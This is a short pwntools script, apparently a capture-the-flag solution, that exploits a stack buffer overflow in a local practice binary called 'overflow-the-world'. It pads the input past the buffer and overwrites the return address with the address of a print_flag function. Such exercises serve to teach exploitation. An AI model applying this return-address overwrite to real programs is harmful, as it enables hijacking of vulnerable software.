from pwn import *

exe = ELF("./overflow-the-world")

r = process([exe.path])
# gdb.attach(r)

print_call = exe.symbols["print_flag"]

payload = b'A' * 64      # Fill buffer
payload += b'B' * 8
payload += p64(print_call)      # Overwrite return address with print_flag

r.recvuntil(b"What's your name? ")
r.sendline(payload)

r.recvuntil(b"Let's play a game.\n")
r.interactive()